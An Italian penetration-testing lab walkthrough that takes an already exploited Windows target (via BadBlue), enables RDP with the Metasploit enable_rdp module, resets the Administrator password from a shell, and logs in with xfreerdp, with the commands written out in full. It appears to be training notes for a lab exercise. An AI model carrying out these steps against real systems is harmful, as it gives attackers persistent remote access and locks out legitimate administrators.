# Enabling RDP

<figure><img src="../../../.gitbook/assets/image (26) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Accesso iniziale al sistema target

Come prima avviamo Postgresql e MSF, facciamo uno scan nmap e exploitiamo BadBlue running sulla porta 80, come fatto prima.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
NB: Notiamo che la porta 3389 è chiusa quindi RDP è disabilitato di default su questa macchina target, dovremo fare in modo di abilitarlo.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Abilitare RDP con modulo MSF

```
search enable_rdp
use post/windows/manage/enable_rdp
show options
// è possibile impostare la PASSWORD per un nuovo utente da usare per RDP, 
// ma nel nostro caso cambieremo la password dell'utente NT AUTHORITY\SYSTEM 
// con il quale ci eravamo loggati via exploit BadBlue
// L'opzione FORWARD è utile per i casi di pivoting
set SESSION 1
exploit
db_nmap -p 3389 10.2.19.254 //controlliamo che RDP sia attivo e aperto
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Cambiare password per accedere via RDP

Questo è sconsigliato in casi reali perché ovviamente bloccherebbe fuori l'amministratore e sarebbe un chiaro segnale che il sistema è stato hackerato.

In casi di standard penetration test meglio usare un altro utente differente creandolo con il modulo MSF enable\_rdp, talvolta è necessario anche aggiungerlo al gruppo Administrators.

```
sessions 1
shell
net users
net user Administrator hacker_123321
CTRL+C
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Accesso via RDP (da Kali Linux)

Creiamo un nuovo tab e usiamo xfreerdp utility

```
xfreerdp /u:administrator /p:hacker_123321 /v:10.2.19.254
//scriviamo poi y per accettare il certificato
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
